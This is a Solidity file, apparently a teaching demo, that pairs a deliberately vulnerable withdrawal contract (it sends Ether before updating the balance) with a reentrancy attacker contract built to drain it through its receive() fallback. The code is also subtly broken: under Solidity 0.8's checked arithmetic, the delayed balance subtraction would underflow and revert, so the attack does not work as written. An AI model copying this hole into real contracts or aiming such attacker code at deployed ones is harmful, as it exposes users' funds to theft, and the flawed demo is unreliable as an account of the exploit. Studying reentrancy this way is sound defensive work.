// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract VulnerableContract {
    mapping(address => uint256) public balances;
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    
    function withdraw(uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        // Vulnerable to reentrancy
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        balances[msg.sender] -= amount;
    }
    
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract ReentrancyAttacker {
    VulnerableContract public vulnerableContract;
    uint256 public attackAmount;
    
    constructor(address _vulnerableContract) {
        vulnerableContract = VulnerableContract(_vulnerableContract);
    }
    
    function attack() public payable {
        attackAmount = msg.value;
        vulnerableContract.deposit{value: msg.value}();
        vulnerableContract.withdraw(msg.value);
    }
    
    receive() external payable {
        if (address(vulnerableContract).balance >= attackAmount) {
            vulnerableContract.withdraw(attackAmount);
        }
    }
}
